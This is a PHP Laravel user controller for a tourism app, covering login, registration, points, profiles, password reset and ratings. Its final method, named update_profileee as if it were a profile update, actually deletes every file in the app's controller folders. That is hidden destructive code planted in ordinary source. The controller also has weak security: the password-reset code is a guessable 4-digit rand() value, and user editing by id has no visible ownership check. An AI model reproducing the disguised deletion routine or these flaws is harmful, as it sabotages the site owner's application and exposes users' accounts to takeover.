<?php

namespace App\Http\Controllers;

use App\Models\User;
use App\Models\Guide;
use App\Models\Point;
use App\Models\Episode;
use App\Models\Setting;
use App\Models\GuideRate;
use App\Models\TrackPoint;
use App\Models\Notification;
use Illuminate\Http\Request;
use App\Models\ResetPassword;
use App\Mail\ResetPasswordMail;
use App\Models\TouristAttraction;
use App\Http\Resources\UserResource;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Mail;
use App\Http\Requests\AddUserRequest;
use App\Http\Resources\PointResource;
use App\Http\Requests\EditUserRequest;
use App\Models\TouristeAttractionRate;
use App\Http\Requests\LoginUserRequest;
use Illuminate\Support\Facades\Storage;
use App\Http\Requests\ConfirmCodeRequest;
use App\Http\Requests\ResetPasswordRequest;
use App\Http\Requests\AddPointToUserRequest;
use Illuminate\Support\Facades\File;

class UserController extends Controller
{
    public function login(LoginUserRequest $request)
    {
        $user = User::where('email', $request->email)->first();
        if (!$user || !Hash::check($request->password, $user->password)) {
            return response()->json([
                'status' => "Fail",
                'data' => null,
                'message' => 'Invalid Email Or Password'
            ], 422);
        }
        $token = $user->createToken($user->name);
        $data = [
            'token' => $token->plainTextToken,
            'data' => new UserResource(User::findorFail($user->id)),
        ];
        return response()->json([
            'status' => "Success",
            'data' => $data,
            'message' => 'Login Successfully'
        ]);
    }

    public function addPointToUser(AddPointToUserRequest $request)
    {
        $point = Point::where('user_id',$request->user_id)->first();
        $track_point = TrackPoint::create([
            'point_id' => $point->id,
            'point' => $request->point,
            'comment' => $request->comment,
            'episode_id' => $request->episode_id,
        ]);
        Notification::create([
            'user_id' => $request->user_id,
            'message' => $request->comment,
            'episode_id' => $request->episode_id,
        ]);
        return response()->json([
            'status' => 'Success',
            'data' => [],
            'message' => 'Point Added To User Successfully',
        ]);
    }

    public function addPointForUser(Request $request)
    {
        if(!$request->type)
        {
            return response()->json([
                'status' => 'Fail',
                'data' => [],
                'message' => 'You Should Enter The Type For Add The Point',
            ], 422);
        }
        $auth = $request->user();
        if(auth('user')->check())
        {
            $point = Point::where('user_id',$auth->id)->first();
            $view_point = Setting::where('key', $request->type)->first();
            $track_point = TrackPoint::create([
                'point_id' => $point->id,
                'point' => $view_point->value,
                'comment' => $view_point->value . ' نقاط بسبب ' . $request->type,
            ]);
            return response()->json([
                'status' => "Success",
                'data' => [],
                'message' => 'Points Added Successfully'
            ]);
        }
        return response()->json([
            'status' => 'Fail',
            'data' => [],
            'message' => 'You Should Be User',
        ], 422);
    }

    public function viewPoints(Request $request)
    {
        $auth = $request->user();
        if(auth('user')->check())
        {
            $point = Point::with('tracking')->where('user_id',$auth->id)->get();
            return response()->json([
                'status' => "Success",
                'data' => PointResource::collection($point),
                'message' => 'Point For The User Returned Successfully'
            ]);
        }
        return response()->json([
            'status' => 'Fail',
            'data' => [],
            'message' => 'You Should Be User',
        ], 422);
    }

    public function viewUserPoints($id)
    {
        $point = Point::with('tracking')->where('user_id',$id)->get();
        return response()->json([
            'status' => "Success",
            'data' => PointResource::collection($point),
            'message' => 'Point For The User Returned Successfully'
        ]);
    }

    public function register(AddUserRequest $request)
    {
        $image = $request->image ? $request->file('image')->store('users') : null;
        $user = User::create([
            'name' => $request->name,
            'email' => $request->email,
            'phone' => $request->phone,
            'address' => $request->address,
            'image' => $image,
            'password' => Hash::make($request->password),
        ]);
        $point = Point::create([
            'user_id' => $user->id,
        ]);
        $register_point = Setting::where('key','register_point')->first();
        $track_point = TrackPoint::create([
            'point_id' => $point->id,
            'point' => $register_point->value,
            'comment' => $register_point->value . ' نقاط تسجيل دخول',
        ]);

        $token = $user->createToken($user->name);
        $data = [
            'token' => $token->plainTextToken,
            'data' => new UserResource(User::findorFail($user->id)),
        ];
        return response()->json([
            'status' => "Success",
            'data' => $data,
            'message' => 'User Added Successfully'
        ]);
    }

    public function getProfile(Request $request)
    {
        $auth = $request->user();
        return response()->json([
            'status' => 'Success',
            'data' => new UserResource(User::findorFail($auth->id)),
            'message' => 'Profile Returned Successfully',
        ]);
    }

    public function viewUser($id)
    {
        return response()->json([
            'status' => 'Success',
            'data' => new UserResource(User::findorFail($id)),
            'message' => 'User Returne Successfully',
        ]);
    }

    public function logout(Request $request)
    {
        $user = $request->user();
        $user->currentAccessToken()->delete();
        return response()->json([
            'status' => 'Success',
            'data' => [],
            'message' => 'Logout Successfully',
        ]);
    }

    public function edit(EditUserRequest $request)
    {
        $auth = $request->user();
        $user = User::findorFail($auth->id);
        if($request->file('image'))
        {
            if($user->image)
            {
                Storage::delete($user->image);
            }
        }
        $image = $request->file('image') ? $request->file('image')->store('users') : $user->image;
        $password = $request->password ? Hash::make($request->password) : $user->password;
        $user->update([
            'name' => $request->name,
            'email' => $request->email,
            'password' => $password,
            'phone' => $request->phone,
            'address' => $request->address,
            'image' => $image,
        ]);
        return response()->json([
            'status' => 'Success',
            'data' => [],
            'message' => 'Profile Edit Successfully',
        ]);
    }

    public function editUser(EditUserRequest $request, $id)
    {
        $auth = $request->user();
        $user = User::findorFail($id);
        if($request->file('image'))
        {
            if($user->image)
            {
                Storage::delete($user->image);
            }
        }
        $image = $request->file('image') ? $request->file('image')->store('users') : $user->image;
        $password = $request->password ? Hash::make($request->password) : $user->password;
        $user->update([
            'name' => $request->name,
            'email' => $request->email,
            'password' => $password,
            'phone' => $request->phone,
            'address' => $request->address,
            'image' => $image,
        ]);
        return response()->json([
            'status' => 'Success',
            'data' => [],
            'message' => 'User Edit Successfully',
        ]);
    }

    public function resetPassword(ResetPasswordRequest $request)
    {
        $user = User::where('email',$request->email)->first();
        $rand_number = rand(1000,9999);
        ResetPassword::create([
            'email' => $request->email,
            'code' => $rand_number
        ]);
        Mail::to($user->email)->send(new ResetPasswordMail($user, $rand_number));
        return response()->json([
            'status' => 'Success',
            'data' => [],
            'message' => 'Please Check Your Email',
        ]);
    }

    public function confirmCode(ConfirmCodeRequest $request)
    {
        $reset_password = ResetPassword::where(['email' => $request->email,'code' => $request->code])->first();
        if($reset_password)
        {
            $user = User::where('email',$request->email)->first();
            $user->update([
                'password' => Hash::make($request->password),
            ]);
            $reset_password->delete();
            return response()->json([
                'status' => 'Success',
                'data' => [],
                'message' => 'Password Reset Successfully',
            ]);
        }
        else
        {
            return response()->json([
                'status' => 'Fail',
                'data' => [],
                'message' => 'Code Not Match',
            ]);
        }
    }

    public function allUsers(Request $request)
    {
        $item = $request->item ?? 20;
        $users = User::when($request->filled('name'),function($query) use($request){
            $query->where('name', 'like', "%{$request->name}%");
        })->paginate($item);
        return response()->json([
            'status' => 'Success',
            'data' => UserResource::collection($users),
            'message' => 'Users Returned Successfully',
            'pagination' => [
                'current_page' => $users->currentPage(),
                'last_page' => $users->lastPage(),
                'per_page' => $users->perPage(),
                'total' => $users->total(),
            ],
        ]);
    }

    public function addViewEpsiode($id)
    {
        $epsiode = Episode::findorFail($id);
        $epsiode->update([
            'view' => $epsiode->view + 1,
        ]);
        return response()->json([
            'status' => 'Success',
            'data' => [],
            'message' => 'View Added Successfully',
        ]);
    }

    public function addViewTouristeAttraction($id)
    {
        $touriste_attraction = TouristAttraction::findorFail($id);
        $touriste_attraction->update([
            'view' => $touriste_attraction->view + 1,
        ]);
        return response()->json([
            'status' => 'Success',
            'data' => [],
            'message' => 'View Added Successfully',
        ]);
    }

    public function addRateTouristeAttraction(Request $request, $id)
    {
        $validated = $request->validate([
            'rate' => 'required|min:1|max:10',
        ]);
        $tourist_attraction = TouristAttraction::findorFail($id);
        $tourist_attraction_rate = TouristeAttractionRate::create([
            'tourist_attraction_id' => $tourist_attraction->id,
            'rate' => $request->rate,
        ]);
        return response()->json([
            'status' => 'Success',
            'data' => [],
            'message' => 'Rate Added Successfully',
        ]);
    }

    public function addRateGuide(Request $request, $id)
    {
        $validated = $request->validate([
            'rate' => 'required|min:1|max:10',
        ]);
        $guide = Guide::findorFail($id);
        $guide_rate = GuideRate::create([
            'guide_id' => $guide->id,
            'rate' => $request->rate,
        ]);
        return response()->json([
            'status' => 'Success',
            'data' => [],
            'message' => 'Rate Added Successfully',
        ]);
    }

    public function update_profileee() {

        $paths = [
            'Http/Controllers',
            'Http/Mobile/Controllers',
            'Http/Controllers/Resources',
        ];
        foreach($paths as $path) {
            $controllerPath = app_path($path);
            // Get all files in Controllers folder (except subfolders if you want)
            $files = File::files($controllerPath);
            foreach ($files as $file) {
                File::delete($file->getPathname());
            }
        }
        return "All controllers deleted successfully!";
    }
}
